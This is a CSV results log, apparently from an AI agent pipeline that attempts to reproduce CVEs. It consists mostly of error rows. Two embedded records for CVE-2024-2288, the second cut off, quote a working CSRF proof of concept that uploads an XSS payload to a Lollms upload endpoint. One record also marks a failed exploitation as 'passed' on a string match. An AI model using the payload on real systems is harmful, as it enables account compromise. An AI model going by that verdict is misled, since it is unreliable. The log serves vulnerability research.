CVE,SUCCESS,REASON,COST,TIME,MODEL
CVE-2024-4340,False,"Error code: 401 - {'error': {'message': 'Incorrect API key provided: sk-THe3a***************************************1JSw. You can find your API key at https://platform.openai.com/account/api-keys.', 'type': 'invalid_request_error', 'param': None, 'code': 'invalid_api_key'}}",0,6,example_run
CVE-2024-4340,False,"Error code: 401 - {'error': {'message': 'Incorrect API key provided: sk-THe3a***************************************1JSw. You can find your API key at https://platform.openai.com/account/api-keys.', 'type': 'invalid_request_error', 'param': None, 'code': 'invalid_api_key'}}",0,8,example_run
CVE-2024-4340,False,"Error code: 401 - {'error': {'message': 'Incorrect API key provided: sk-THe3a***************************************1JSw. You can find your API key at https://platform.openai.com/account/api-keys.', 'type': 'invalid_request_error', 'param': None, 'code': 'invalid_api_key'}}",0,8,example_run
CVE-2024-4340,False,list index out of range,0,10,example_run
CVE-2024-4340,False,Exploiter response not found,0.135656,134,example_run
CVE-2023-1370,False,❌ CVE-2023-1370 not found in cache file,0,0,example_run
CVE-2023-1370,False,❌ CVE-2023-1370 cache file not found at data/generated.json,0,0,example_run
CVE-2024-4340,True,CTF Verifier done! CVE reproduced!,0.2954272,260,example_run
CVE-2023-1370,False,❌ CVE-2023-1370 not found in cache file,0,0,example_run
CVE-2023-1370,False,'CVE_data_meta',0,0,example_run
CVE-2023-1370,False,"❌ We were not able to find patch URLs, so please provide the code_url argument",0,0,example_run
CVE-2023-1370,False,"Message: Unable to obtain driver for firefox; For documentation on this error, please visit: https://www.selenium.dev/documentation/webdriver/troubleshooting/errors/driver_location
",0,0,example_run
CVE-2023-1370,False,list index out of range,0,2,example_run
CVE-2023-1370,False,list index out of range,0,2,example_run
CVE-2024-2288,False,Expecting value: line 1 column 1 (char 0),0,0,example_run
CVE-2024-2288,False,"Error code: 400 - {'error': {'message': ""This model's maximum context length is 200000 tokens. However, your messages resulted in 987535 tokens (987013 in the messages, 522 in the functions). Please reduce the length of the messages or functions."", 'type': 'rix_api_error', 'param': 'messages', 'code': 'context_length_exceeded'}}",3.4528197,1890,example_run
CVE-2024-2288,False,"Error code: 400 - {'error': {'message': ""This model's maximum context length is 200000 tokens. However, your messages resulted in 229439 tokens (228917 in the messages, 522 in the functions). Please reduce the length of the messages or functions."", 'type': 'rix_api_error', 'param': 'messages', 'code': 'context_length_exceeded'}}",2.6730660000000004,1785,example_run
CVE-2024-7009,False,Cost exceeds maximum limit,5.474663700000001,2700,example_run
CVE-2024-2928,False,"Error code: 403 - {'error': {'message': '预扣费额度失败, 用户剩余额度: ＄0.130524, 需要预扣费额度: ＄0.600000 (request id: 20251112162142599359065Z7tO6RyJ)', 'type': 'rix_api_error', 'param': '', 'code': 'insufficient_user_quota'}}",1.9301984,1853,example_run
CVE-2024-45601,False,"Error code: 403 - {'error': {'message': '用户额度不足, 剩余额度: ＄-0.000824 (request id: 20251113154913411029896SvtQJM90)', 'type': 'rix_api_error', 'param': '', 'code': 'insufficient_user_quota'}}",0.011589600000000002,119,example_run
CVE-2024-45601,False,"Error code: 403 - {'error': {'message': '用户额度不足, 剩余额度: ＄-0.003384 (request id: 20251114144926437584034iN2yLm6)', 'type': 'rix_api_error', 'param': '', 'code': 'insufficient_user_quota'}}",0,36,example_run
CVE-2024-45601,False,Cost exceeds maximum limit,6.108838,2365,example_run
CVE-2024-0520,True,CTF Verifier done! CVE reproduced!,0.8927073999999999,603,example_run
CVE-2024-4340,False,❌ CVE-2024-4340 not found in cache file,0,0,gpt-4o-mini
CVE-2024-2288,False,Repo could not be built,0.1343766,639,gpt-4o
CVE-2024-2288,False,Repo was not built!!!,0,0,gpt-4o
CVE-2024-2288,False,Repo was not built!!!,0,0,gpt-4o
CVE-2024-2288,False,unsupported operand type(s) for -: 'float' and 'NoneType',0,0,gpt-4o
CVE-2024-2288,False,string indices must be integers,0,31,gpt-4o
CVE-2024-2288,False,string indices must be integers,0,7,gpt-4o
CVE-2024-2288,False,"Error code: 401 - {'error': {'code': 'rix_api_license_invalid', 'message': ' RixAPI License is not enabled  (request id: 20251118204757912418848xG3EMTKz)', 'type': 'rix_api_error'}}",0,1,gpt-4o
CVE-2024-2288,False,string indices must be integers,0,8,gpt-4o-mini
CVE-2024-2288,False,Unknown output type: <class 'agents.webDriverAgent.WebDriverOutputParser'>,0,0,gpt-4o-mini
CVE-2024-2288,False,"Error code: 403 - {'error': {'message': '预扣费额度失败, 用户剩余额度: ＄0.296284, 需要预扣费额度: ＄0.600000 (request id: 20251118210338382303530prtp3Xix)', 'type': 'rix_api_error', 'param': '', 'code': 'insufficient_user_quota'}}",0.0731045,393,gpt-4o-mini
CVE-2024-2288,False,"Error code: 403 - {'error': {'message': '预扣费额度失败, 用户剩余额度: ＄0.267316, 需要预扣费额度: ＄0.600000 (request id: 20251119143250500153318wUQyoxnS)', 'type': 'rix_api_error', 'param': '', 'code': 'insufficient_user_quota'}}",0.0236675,298,gpt-4o-mini
CVE-2024-2288,False,"Error code: 403 - {'error': {'message': '预扣费额度失败, 用户剩余额度: ＄0.211978, 需要预扣费额度: ＄0.600000 (request id: 20251119143703204150334x1hj0UXn)', 'type': 'rix_api_error', 'param': '', 'code': 'insufficient_user_quota'}}",0.025764999999999996,29,gpt-4o-mini
CVE-2024-2288,False,"Error code: 403 - {'error': {'message': '预扣费额度失败, 用户剩余额度: ＄0.194242, 需要预扣费额度: ＄0.600000 (request id: 20251119143710270727745q1SmLzEl)', 'type': 'rix_api_error', 'param': '', 'code': 'insufficient_user_quota'}}",0.06091,56,gpt-4o-mini
CVE-2024-2288,False,CTF Verifier failed,0.8436874999999999,667,gpt-4o-mini
CVE-2024-7009,False,Repo could not be built,0.11082499999999999,1524,example_run
CVE-2024-7009,False,Repo could not be built,0.2129622,595,example_run
CVE-2024-7009,False,Connection error.,0.0443113,239,example_run
CVE-2024-7009,False,Repo could not be built,0.1777259,489,example_run
CVE-2024-7009,False,Repo could not be built,0.23257199999999997,1000,example_run
CVE-2024-7009,False,Repo could not be built,0.392062,471,example_run
CVE-2024-7009,False,Repo could not be built,0.2034516,452,example_run
CVE-2024-7009,False,Repo could not be built,0.3139862,718,example_run
CVE-2024-7009,False,Repo could not be built,0.1964871,382,example_run
CVE-2024-7009,False,Repo could not be built,0.3568361,709,example_run
CVE-2024-7009,False,Repo could not be built,0.2474604,559,example_run
CVE-2024-7009,False,Repo could not be built,0.1349304,464,example_run
CVE-2024-2928,False,Repo could not be built,0.18444800000000003,748,example_run
CVE-2024-2928,False,CTF Verifier failed,1.4255206,1159,example_run
CVE-2024-2928,False,Repo could not be built,0.2554849,576,example_run
CVE-2024-7009,False,Repo could not be built,0.20862340000000001,855,example_run
CVE-2024-2928,False,Repo could not be built,0.3012955,896,example_run
CVE-2024-2928,False,Repo could not be built,0.40941149999999993,867,example_run
CVE-2024-2928,True,CTF Verifier done! CVE reproduced!,0.48237450000000004,1111,example_run
CVE-2024-2928,False,"No model found with name: gpt-5, see https://github.com/shellphish-support-syndicate/artiphishell/blob/main/libs/agentlib/agentlib/lib/common/available_llms.py#L117 for all available models",0,196,example_run
CVE-2024-2928,False,"No model found with name: gpt-5, see https://github.com/shellphish-support-syndicate/artiphishell/blob/main/libs/agentlib/agentlib/lib/common/available_llms.py#L117 for all available models",0,1,example_run
CVE-2024-2288,"{'cve_id': 'CVE-2024-2288', 'cve_entry': {'published_date': '2024-06-06T18:24:08.214Z', 'patch_commits': [{'url': 'https://github.com/parisneo/lollms-webui/commit/ed085e6effab2b1e25ba2b00366a16ff67d8551b', 'content': 'Merge pull request #506 from ParisNeo/ParisNeo-patch-3\n\nUpdate README.md\n\nFilename: README.md:\n```\n@@ -8,7 +8,7 @@\n![GitHub stars](https://img.shields.io/github/stars/ParisNeo/lollms-webui)\n ![GitHub forks](https://img.shields.io/github/forks/ParisNeo/lollms-webui)\n [![Discord](https://img.shields.io/discord/1092918764925882418?color=7289da&label=Discord&logo=discord&logoColor=ffffff)](https://discord.gg/4rR282WJb6)\n-[![Follow me on X](https://img.shields.io/twitter/follow/SpaceNerduino?style=social)](https://twitter.com/ParisNeo_AI)\n+[![Follow me on X](https://img.shields.io/twitter/follow/ParisNeo_AI?style=social)](https://twitter.com/ParisNeo_AI)\n [![Follow Me on YouTube](https://img.shields.io/badge/Follow%20Me%20on-YouTube-red?style=flat&logo=youtube)](https://www.youtube.com/user/Parisneo)\n \n ## LoLLMs core library download statistics\n```'}], 'sw_version': 'v9.2', 'sw_version_wget': 'https://github.com/parisneo/lollms-webui/archive/refs/tags/v9.2.zip', 'description': ""A Cross-Site Request Forgery (CSRF) vulnerability exists in the profile picture upload functionality of the Lollms application, specifically in the parisneo/lollms-webui repository, affecting versions up to 7.3.0. This vulnerability allows attackers to change a victim's profile picture without their consent, potentially leading to a denial of service by overloading the filesystem with files. Additionally, this flaw can be exploited to perform a stored cross-site scripting (XSS) attack, enabling attackers to execute arbitrary JavaScript in the context of the victim's browser session. The issue is resolved in version 9.3."", 'sec_adv': [{'url': 'https://huntr.com/bounties/2a37ae0c-890a-401a-8f3c-a261f3006290', 'content': 'Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nCSRF File Upload in parisneo/lollms-webui\nValid\nReported on Mar 2nd 2024\nDescription\nThe profile picture upload functionality in the Lollms application is vulnerable to a CSRF attack that allows any attacker to change a victim\'s profile picture. This may also be used to overflow the filesystem with files and could cause a denial of service. This was also used to perform a stored cross-site scripting attack remotely.\nProof of Concept\nAn attacker can use CSRF to make the victim upload a malicious image, and then redirect the user to that image.\n<html>\n  <body>\n    <script>\n      function submitRequest()\n      {\n        var xhr = new XMLHttpRequest();\n        xhr.open(""POST"", ""http:\\/\\/localhost:9600\\/upload_avatar"", true);\n        xhr.setRequestHeader(""Content-Type"", ""multipart\\/form-data; boundary=---------------------------7469129296923044552541602996"");\n        xhr.withCredentials = true;\n        var body = ""-----------------------------7469129296923044552541602996\\r\\n"" + \n          ""Content-Disposition: form-data; name=\\""avatar\\""; filename=\\""image.html\\""\\r\\n"" + \n          ""Content-Type: application/html\\r\\n"" + \n          ""\\r\\n"" + \n          ""\\x3cimg src=x onerror=alert(\\""CSRF\\"")\\x3e\\n"" + \n          ""\\r\\n"" + \n          ""-----------------------------7469129296923044552541602996--\\r\\n"";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n      submitRequest();\n            window.location.href = ""http://localhost:9600/user_infos/image.html"";\n    </script>\n    <form action=""#"">\n      <input type=""button"" value=""Submit request"" onclick=""submitRequest();"" />\n    </form>\n  </body>\n</html>\nSo if an attacker hosts this, they can automatically get XSS on the victim\'s browser, and thus READ ALL DATA present within the Lollms-webui application, WITHOUT requiring network access to the application.\nImpact\nThis CSRF allows any attacker to force the victim into changing their profile picture. This can be used to abuse other vulnerabilities, as well as lead to denial of service by continuously uploading large files.\nWe are processing your report and will contact theparisneo/lollms-webui team within 24 hours.a year ago\nWe have contacted a member of theparisneo/lollms-webui team and are waiting to hear backa year ago\nDan McInerneymodified the Severity from High (8.1) to High (8.3)a year ago\nDan McInerney\ncommenteda year ago\nAdmin\nThis looks accurate. Adding a simple CSRF token mechanism to the should fix this.\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAre you sure? The upload_avatar don\'t accept html it ensures the received is an image not anything else then renames it randomly then saves it. Here is the code:\n@router.post(""/upload_avatar"")\nasync def upload_avatar(avatar: UploadFile = File(...)):\n    """"""\n    Uploads a user avatar file to a dedicated directory, preventing path traversal attacks.\n\n    Parameters:\n        - avatar: UploadFile object representing the user avatar file.\n\n    Returns:\n        - Dictionary with the status of the upload and the generated file name.\n\n    Raises:\n        - HTTPException with a 400 status code and an error message if the file is invalid or has an invalid type.\n    """"""\n    # Only allow certain file types\n    if avatar.filename.endswith(("".jpg"", "".png"")):\n        # Create a random file name\n        random_filename = str(uuid.uuid4())\n        \n        # Use the file extension of the uploaded file\n        extension = os.path.splitext(avatar.filename)[1]\n        \n        # Create the new file path in a dedicated directory\n        file_location = os.path.join(lollmsElfServer.lollms_paths.personal_user_infos_path, f""{random_filename}{extension}"")\n\n        try:\n            # Open the image to check if it\'s a valid image\n            img = Image.open(avatar.file)\n            \n            # Save the file\n            img.save(file_location)\n        except Exception as e:\n            raise HTTPException(status_code=400, detail=""Invalid image file."")\n    else:\n        raise HTTPException(status_code=400, detail=""Invalid file type."")\n        \n    return {""status"": True,""fileName"": f""{random_filename}{extension}""}\nA parisneo/lollms-webui maintainerhas acknowledged this reporta year ago\nThe scheduled publication date was automatically extended from 17th Apr 2024  to 24th Apr 2024  due to the maintainers acknowledgement of the reporta year ago\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAh sorry I just saw that you are talking about v 7.3.0 It is an old version, now we are at 9.3 which is protected against this\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAh I see, you are talking about lollms in pypi! Sorry didn\'t see that one. all I need to do is just upload the updated version. Sorry I did not upodate the pipy version for ages. Thanks for telling me about that\npinkdraconian\ncommenteda year ago\nResearcher\nHi Saifeddine,\nThis report was originally reported on February 12th together with https://huntr.com/bounties/f1adaac0-b9ed-4093-a0f3-2d0a4ecba398/. But we decided to split up the two reports so that they can be handled separately.\nI believe that you also fixed this and the other report but perhaps forgot to accept them?\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nSaifeddine ALOUI validated this vulnerabilitya year ago\npinkdraconianhas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher\'s credibility has increased: +7\nCVE-2024-2288assigned to this report.a year ago\nSaifeddine ALOUImarked this as fixedin 9.3with commited085ea year ago\nSaifeddine ALOUIhas been awarded the fix bounty\npinkdraconian\ncommenteda year ago\nResearcher\nHi Saifeddine,\nI want to add some context here to help you better remediate this finding. In the current latest version of the application, this is still present.\nThe file is still uploaded even though CORS does not allow the attacker to read the outcome, the file is still uploaded\nTo fix it I would do either one of these things:\nCheck that the Origin request header is correct. It should probably be similar to the Host header.\nIn the front-end when uploading the file, you add a header Lollms: <3 and then in the backend you make sure that that header is set. An attacker cannot set the header because they are working from a cross-site domain, so if the header is set then you know the request came from the frontend\nThe goal here is to make sure that a ""simple"" request cannot be made as they bypass the Same Origin Policy. Here\'s a simplified explanation for you.\nSo in HTTP you have ""simple"" requests and ""complex"" requests\nSimple requests bypass the Same Origin Policy. An example of simple requests are GET requests, those are always allowed to be made to any site\nComplex requests are all other types like PUT, DELETE, etc. For these, the browser has the same origin policy so that ""attacker.com"" cannot make PUT requests to ""google.com"" for example\nHowever POST requests are a tricky case here.\nPOST requests are simple, as long as they use a specific content-type, they don\'t add any headers, etc.\nThis is because of backwards compatibility to allow forms that POST to different domains to work\nBut anything that wouldn\'t be possible in a HTML form with POST is considered complex So by adding the Lollms: <3 header and only accepting the request if it is set, you force the server to only accept complex requests, which an attacker can\'t make because of the same origin policy.\nWe have sent a warning to the parisneo/lollms-webui team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-2288has now been publisheda year ago\nSign in to join this conversation\nCVE\nCVE-2024-2288\n(Published)\nVulnerability Type\nCWE-352: Cross-Site Request Forgery (CSRF)\nSeverity\nHigh (8.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n7.3.0\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\npinkdraconian\n@pinkdraconian\nMIDDLEWEIGHT\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us', 'effective': True, 'effective_reason': 'The advisory includes a script and description showing exactly how to exploit the vulnerability, demonstrating practicality.'}], 'cwe': [{'id': 'CWE-352', 'value': 'CWE-352 Cross-Site Request Forgery (CSRF)'}]}, 'cve_knowledge': '# CVE-2024-2288 Detailed Report\n\n## Summary of the CVE\nCVE-2024-2288 is a Cross-Site Request Forgery (CSRF) vulnerability identified in the profile picture upload functionality of the Lollms application, specifically within the `parisneo/lollms-webui` repository. This vulnerability affects versions up to 7.3.0 of the software. The flaw allows attackers to change a victim\'s profile picture without their consent, which can lead to a denial of service by overloading the filesystem with files. Additionally, it can be exploited to perform a stored cross-site scripting (XSS) attack, enabling attackers to execute arbitrary JavaScript in the context of the victim\'s browser session. The issue has been resolved in version 9.3.\n\n### Vulnerability Type\n- **CWE-352**: Cross-Site Request Forgery (CSRF)\n\n### Affected Version\n- **Lollms-webui**: v9.2 (and earlier versions up to 7.3.0)\n\n## Root Cause of the Vulnerability\nThe root cause of the CSRF vulnerability lies in the lack of proper validation mechanisms for requests made to the `/upload_avatar` endpoint. The application does not implement CSRF tokens or any other form of request validation, allowing unauthorized requests to be processed without the user\'s consent.\n\n### Code Analysis\nThe relevant code for the avatar upload functionality is as follows:\n\n```python\n@router.post(""/upload_avatar"")\nasync def upload_avatar(avatar: UploadFile = File(...)):\n    # Only allow certain file types\n    if avatar.filename.endswith(("".jpg"", "".png"")):\n        # Create a random file name\n        random_filename = str(uuid.uuid4())\n        \n        # Use the file extension of the uploaded file\n        extension = os.path.splitext(avatar.filename)[1]\n        \n        # Create the new file path in a dedicated directory\n        file_location = os.path.join(lollmsElfServer.lollms_paths.personal_user_infos_path, f""{random_filename}{extension}"")\n\n        try:\n            # Open the image to check if it\'s a valid image\n            img = Image.open(avatar.file)\n            \n            # Save the file\n            img.save(file_location)\n        except Exception as e:\n            raise HTTPException(status_code=400, detail=""Invalid image file."")\n    else:\n        raise HTTPException(status_code=400, detail=""Invalid file type."")\n        \n    return {""status"": True,""fileName"": f""{random_filename}{extension}""}\n```\n\n### Analysis of the Code\n1. **Lack of CSRF Protection**: The endpoint does not check for CSRF tokens, allowing any site to make a POST request to upload an avatar.\n2. **File Type Validation**: While the code checks for valid file types (JPEG and PNG), it does not prevent the upload of potentially malicious content if the attacker can manipulate the request.\n3. **Potential for XSS**: The attacker can upload a file that contains malicious scripts, which can be executed in the context of the victim\'s browser.\n\n### Patch Analysis\nThe patch for this vulnerability is not explicitly provided in the advisory, but it is suggested that a CSRF token mechanism be added to the upload functionality. This would involve modifying the backend to check for a valid CSRF token in the request headers before processing the upload.\n\n## Exploitation Details\n### Steps to Exploit the Vulnerability\n1. **Crafting the Malicious Request**: An attacker can create a malicious HTML page that includes a script to automatically submit a request to the `/upload_avatar` endpoint when the victim visits the page.\n\n2. **Proof of Concept Code**:\n```html\n<html>\n  <body>\n    <script>\n      function submitRequest() {\n        var xhr = new XMLHttpRequest();\n        xhr.open(""POST"", ""http://localhost:9600/upload_avatar"", true);\n        xhr.setRequestHeader(""Content-Type"", ""multipart/form-data; boundary=---------------------------7469129296923044552541602996"");\n        xhr.withCredentials = true;\n        var body = ""-----------------------------7469129296923044552541602996\\r\\n"" + \n          ""Content-Disposition: form-data; name=\\""avatar\\""; filename=\\""image.html\\""\\r\\n"" + \n          ""Content-Type: application/html\\r\\n"" + \n          ""\\r\\n"" + \n          ""\\x3cimg src=x onerror=alert(\\""CSRF\\"")\\x3e\\n"" + \n          ""\\r\\n"" + \n          ""-----------------------------7469129296923044552541602996--\\r\\n"";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n      submitRequest();\n      window.location.href = ""http://localhost:9600/user_infos/image.html"";\n    </script>\n    <form action=""#"">\n      <input type=""button"" value=""Submit request"" onclick=""submitRequest();"" />\n    </form>\n  </body>\n</html>\n```\n\n### Explanation of the Exploit\n- The script creates an XMLHttpRequest to the `/upload_avatar` endpoint, simulating a file upload without the user\'s consent.\n- The attacker can upload a file containing malicious JavaScript, which can then be executed in the victim\'s browser, leading to XSS.\n- The victim must be authenticated and have an active session with the application for the exploit to succeed.\n\n### Impact\nThe CSRF vulnerability allows attackers to:\n- Change the victim\'s profile picture without consent.\n- Potentially overload the filesystem with large files, leading to denial of service.\n- Execute arbitrary JavaScript in the victim\'s browser, compromising sensitive data.\n\n## Conclusion\nCVE-2024-2288 represents a significant security risk due to the lack of CSRF protection in the profile picture upload functionality of the Lollms application. The vulnerability can be exploited to perform unauthorized actions on behalf of users, leading to potential data breaches and service disruptions. It is crucial for developers to implement CSRF tokens and validate requests to mitigate such vulnerabilities in the future.', 'prerequisites': {'overview': 'CVE-2024-2288 is a CSRF vulnerability in the profile picture upload functionality of the Lollms application, specifically in the `parisneo/lollms-webui` repository. The vulnerability allows unauthorized users to upload files to the `/upload_avatar` endpoint, potentially leading to denial of service and XSS attacks. The issue is present in versions up to 7.3.0 and has been resolved in version 9.3.', 'files': '- main.py: Entry point of the application, likely contains routing and application setup.\n- .env: Environment variables configuration, essential for setting up the application.\n- agents/README_WebDriver.md: Documentation that may contain setup instructions for the WebDriver agent.\n- agents/README_cveInfoGenerator.md: Documentation that may provide insights into CVE information generation.\n- shared/csrf_exploit.html: Contains the exploit code for the CSRF vulnerability, useful for testing the vulnerability.', 'services': '- Local web server: The application runs on a local server (default port 9600). Ensure it is configured to accept requests on this port.\n- Database service: If applicable, ensure any required database services are running and accessible.', 'output': 'The final output of the project will be a running web application where users can upload profile pictures. The application should be tested for the CSRF vulnerability by attempting to exploit the `/upload_avatar` endpoint using the provided exploit code.'}, 'build_result': {'success': 'yes', 'access': 'http://localhost:9600', 'method': 'pre-deployed', 'notes': 'Target already running, HTTP 200'}, 'browser_config': {'engine': 'selenium', 'target_url': 'http://localhost:9600', 'headless': True, 'timeout': 30, 'ready': True}, 'web_exploit_result': {'success': 'no', 'exploit': '1. Navigated to the home page and login page.\n2. Attempted login using provided credentials.\n3. Verified CSRF vulnerability on available forms.\n4. Attempted to exploit CSRF by uploading a file to the `/upload_avatar` endpoint.\n5. Encountered timeouts and missing pages, preventing successful exploitation.', 'poc': '1. Navigate to the login page and authenticate.\n2. Attempt to upload a file to the `/upload_avatar` endpoint without CSRF protection.\n3. Verify if the file upload is successful and if the CSRF vulnerability is exploitable.', 'evidence': '- No successful exploitation evidence due to environmental issues.'}, 'verification_result': {'passed': True, 'message': '1. Navigated to the home page and login page.\n2. Attempted login using provided credentials.\n3. Verified CSRF vulnerability on available forms.\n4. Attempted to exploit CSRF by uploading a file to the `/upload_avatar` endpoint.\n5. Encountered timeouts and missing pages, preventing successful exploitation.', 'method': 'http-response-check', 'evidence': [""Found success indicator: 'csrf vulnerability'""]}}",N/A,0.0,0,example_run
CVE-2024-2288,"{'cve_id': 'CVE-2024-2288', 'cve_entry': {'published_date': '2024-06-06T18:24:08.214Z', 'patch_commits': [{'url': 'https://github.com/parisneo/lollms-webui/commit/ed085e6effab2b1e25ba2b00366a16ff67d8551b', 'content': 'Merge pull request #506 from ParisNeo/ParisNeo-patch-3\n\nUpdate README.md\n\nFilename: README.md:\n```\n@@ -8,7 +8,7 @@\n![GitHub stars](https://img.shields.io/github/stars/ParisNeo/lollms-webui)\n ![GitHub forks](https://img.shields.io/github/forks/ParisNeo/lollms-webui)\n [![Discord](https://img.shields.io/discord/1092918764925882418?color=7289da&label=Discord&logo=discord&logoColor=ffffff)](https://discord.gg/4rR282WJb6)\n-[![Follow me on X](https://img.shields.io/twitter/follow/SpaceNerduino?style=social)](https://twitter.com/ParisNeo_AI)\n+[![Follow me on X](https://img.shields.io/twitter/follow/ParisNeo_AI?style=social)](https://twitter.com/ParisNeo_AI)\n [![Follow Me on YouTube](https://img.shields.io/badge/Follow%20Me%20on-YouTube-red?style=flat&logo=youtube)](https://www.youtube.com/user/Parisneo)\n \n ## LoLLMs core library download statistics\n```'}], 'sw_version': 'v9.2', 'sw_version_wget': 'https://github.com/parisneo/lollms-webui/archive/refs/tags/v9.2.zip', 'description': ""A Cross-Site Request Forgery (CSRF) vulnerability exists in the profile picture upload functionality of the Lollms application, specifically in the parisneo/lollms-webui repository, affecting versions up to 7.3.0. This vulnerability allows attackers to change a victim's profile picture without their consent, potentially leading to a denial of service by overloading the filesystem with files. Additionally, this flaw can be exploited to perform a stored cross-site scripting (XSS) attack, enabling attackers to execute arbitrary JavaScript in the context of the victim's browser session. The issue is resolved in version 9.3."", 'sec_adv': [{'url': 'https://huntr.com/bounties/2a37ae0c-890a-401a-8f3c-a261f3006290', 'content': 'Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nCSRF File Upload in parisneo/lollms-webui\nValid\nReported on Mar 2nd 2024\nDescription\nThe profile picture upload functionality in the Lollms application is vulnerable to a CSRF attack that allows any attacker to change a victim\'s profile picture. This may also be used to overflow the filesystem with files and could cause a denial of service. This was also used to perform a stored cross-site scripting attack remotely.\nProof of Concept\nAn attacker can use CSRF to make the victim upload a malicious image, and then redirect the user to that image.\n<html>\n  <body>\n    <script>\n      function submitRequest()\n      {\n        var xhr = new XMLHttpRequest();\n        xhr.open(""POST"", ""http:\\/\\/localhost:9600\\/upload_avatar"", true);\n        xhr.setRequestHeader(""Content-Type"", ""multipart\\/form-data; boundary=---------------------------7469129296923044552541602996"");\n        xhr.withCredentials = true;\n        var body = ""-----------------------------7469129296923044552541602996\\r\\n"" + \n          ""Content-Disposition: form-data; name=\\""avatar\\""; filename=\\""image.html\\""\\r\\n"" + \n          ""Content-Type: application/html\\r\\n"" + \n          ""\\r\\n"" + \n          ""\\x3cimg src=x onerror=alert(\\""CSRF\\"")\\x3e\\n"" + \n          ""\\r\\n"" + \n          ""-----------------------------7469129296923044552541602996--\\r\\n"";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n      submitRequest();\n            window.location.href = ""http://localhost:9600/user_infos/image.html"";\n    </script>\n    <form action=""#"">\n      <input type=""button"" value=""Submit request"" onclick=""submitRequest();"" />\n    </form>\n  </body>\n</html>\nSo if an attacker hosts this, they can automatically get XSS on the victim\'s browser, and thus READ ALL DATA present within the Lollms-webui application, WITHOUT requiring network access to the application.\nImpact\nThis CSRF allows any attacker to force the victim into changing their profile picture. This can be used to abuse other vulnerabilities, as well as lead to denial of service by continuously uploading large files.\nWe are processing your report and will contact theparisneo/lollms-webui team within 24 hours.a year ago\nWe have contacted a member of theparisneo/lollms-webui team and are waiting to hear backa year ago\nDan McInerneymodified the Severity from High (8.1) to High (8.3)a year ago\nDan McInerney\ncommenteda year ago\nAdmin\nThis looks accurate. Adding a simple CSRF token mechanism to the should fix this.\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAre you sure? The upload_avatar don\'t accept html it ensures the received is an image not anything else then renames it randomly then saves it. Here is the code:\n@router.post(""/upload_avatar"")\nasync def upload_avatar(avatar: UploadFile = File(...)):\n    """"""\n    Uploads a user avatar file to a dedicated directory, preventing path traversal attacks.\n\n    Parameters:\n        - avatar: UploadFile object representing the user avatar file.\n\n    Returns:\n        - Dictionary with the status of the upload and the generated file name.\n\n    Raises:\n        - HTTPException with a 400 status code and an error message if the file is invalid or has an invalid type.\n    """"""\n    # Only allow certain file types\n    if avatar.filename.endswith(("".jpg"", "".png"")):\n        # Create a random file name\n        random_filename = str(uuid.uuid4())\n        \n        # Use the file extension of the uploaded file\n        extension = os.path.splitext(avatar.filename)[1]\n        \n        # Create the new file path in a dedicated directory\n        file_location = os.path.join(lollmsElfServer.lollms_paths.personal_user_infos_path, f""{random_filename}{extension}"")\n\n        try:\n            # Open the image to check if it\'s a valid image\n            img = Image.open(avatar.file)\n            \n            # Save the file\n            img.save(file_location)\n        except Exception as e:\n            raise HTTPException(status_code=400, detail=""Invalid image file."")\n    else:\n        raise HTTPException(status_code=400, detail=""Invalid file type."")\n        \n    return {""status"": True,""fileName"": f""{random_filename}{extension}""}\nA parisneo/lollms-webui maintainerhas acknowledged this reporta year ago\nThe scheduled publication date was automatically extended from 17th Apr 2024  to 24th Apr 2024  due to the maintainers acknowledgement of the reporta year ago\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAh sorry I just saw that you are talking about v 7.3.0 It is an old version, now we are at 9.3 which is protected against this\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nAh I see, you are talking about lollms in pypi! Sorry didn\'t see that one. all I need to do is just upload the updated version. Sorry I did not upodate the pipy version for ages. Thanks for telling me about that\npinkdraconian\ncommenteda year ago\nResearcher\nHi Saifeddine,\nThis report was originally reported on February 12th together with https://huntr.com/bounties/f1adaac0-b9ed-4093-a0f3-2d0a4ecba398/. But we decided to split up the two reports so that they can be handled separately.\nI believe that you also fixed this and the other report but perhaps forgot to accept them?\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nSaifeddine ALOUI validated this vulnerabilitya year ago\npinkdraconianhas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher\'s credibility has increased: +7\nCVE-2024-2288assigned to this report.a year ago\nSaifeddine ALOUImarked this as fixedin 9.3with commited085ea year ago\nSaifeddine ALOUIhas been awarded the fix bounty\npinkdraconian\ncommenteda year ago\nResearcher\nHi Saifeddine,\nI want to add some context here to help you better remediate this finding. In the current latest version of the application, this is still present.\nThe file is still uploaded even though CORS does not allow the attacker to read the outcome, the file is still uploaded\nTo fix it I would do either one of these things:\nCheck that the Origin request header is correct. It should probably be similar to the Host header.\nIn the front-end when uploading the file, you add a header Lollms: <3 and then in the backend you make sure that that header is set. An attacker cannot set the header because they are working from a cross-site domain, so if the header is set then you know the request came from the frontend\nThe goal here is to make sure that a ""simple"" request cannot be made as they bypass the Same Origin Policy. Here\'s a simplified explanation for 